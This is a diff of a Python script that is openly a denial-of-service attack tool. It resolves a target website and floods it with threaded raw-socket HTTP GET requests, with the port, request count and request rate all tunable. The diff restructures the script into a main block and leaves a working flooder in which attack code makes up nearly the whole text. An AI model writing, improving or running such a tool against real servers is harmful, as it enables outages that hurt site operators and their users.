@@ -11,33 +11,6 @@ ip = ""
 port = 0
 num_requests = 0
 
-if len(sys.argv) == 2:
-    port = 80
-    num_requests = 1000
-elif len(sys.argv) == 3:
-    port = int(sys.argv[2])
-    num_requests = 1000
-elif len(sys.argv) == 4:
-    port = int(sys.argv[2])
-    num_requests = int(sys.argv[3])
-else:
-    print("ERROR\n Usage: " +
-          sys.argv[0] + " < Hostname > ")
-    sys.exit(1)
-
-# Convert FQDN to IP
-try:
-    host = str(sys.argv[1]).replace(
-        "https://", "").replace("http://", "").replace("www.", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print(" ERROR\n Make sure you entered a correct website")
-    sys.exit(2)
-
-# Create a shared variable for thread counts
-thread_num = 0
-thread_num_mutex = threading.Lock()
-
 
 # Print thread status
 def print_status():
@@ -61,6 +34,7 @@ def generate_url_path():
 
 # Perform the request
 def attack():
+    """Attacking the target server"""
     print_status()
     url_path = generate_url_path()
 
@@ -70,12 +44,11 @@ def attack():
     try:
         # Open the connection on that raw socket
         dos.connect((ip, port))
-
         # Send the request according to HTTP spec
-        attack_link = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
         # encoding the attack link to BYTES strings
+        attack_link = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
         dos.send(attack_link.encode('utf-8'))
-        # dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+
     except socket.error as e:
         print("\n [No connection, server may be down]: " + str(e))
     finally:
@@ -84,18 +57,54 @@ def attack():
         dos.close()
 
 
-print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
-      str(port) + " || # Requests: " + str(num_requests))
+# def main_ddos_attack():
+    
+if __name__ == "__main__":
 
-# Spawn a thread per request
-all_threads = []
-for i in range(num_requests):
-    t1 = threading.Thread(target=attack)
-    t1.start()
-    all_threads.append(t1)
+    if len(sys.argv) == 2:
+        port = 80
+        num_requests = 1000
+    elif len(sys.argv) == 3:
+        port = int(sys.argv[2])
+        num_requests = 1000
+    elif len(sys.argv) == 4:
+        port = int(sys.argv[2])
+        num_requests = int(sys.argv[3])
+    else:
+        print("ERROR\n Usage: " + sys.argv[0] + " < Hostname > ")
+        sys.exit(1)
 
-    # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
+    # Convert FQDN to IP
+    try:
+        host = str(sys.argv[1]).replace(
+            "https://", "").replace("http://", "").replace("www.", "")
+        ip = socket.gethostbyname(host)
+    except socket.gaierror:
+        print(" ERROR\n Make sure you entered a correct website")
+        sys.exit(2)
 
-for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+    # Create a shared variable for thread counts
+    thread_num = 0
+    thread_num_mutex = threading.Lock()
+
+    # attack
+    attack()
+
+
+    print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
+        str(port) + " || # Requests: " + str(num_requests))
+
+    # Spawn a thread per request
+    all_threads = []
+    for i in range(num_requests):
+        t1 = threading.Thread(target=attack)
+        t1.start()
+        all_threads.append(t1)
+
+        # Adjusting this sleep time will affect requests per second
+        request_per_second = 0.01
+        time.sleep(request_per_second)
+
+    for current_thread in all_threads:
+        current_thread.join()  # Make the main thread wait for the children threads
+
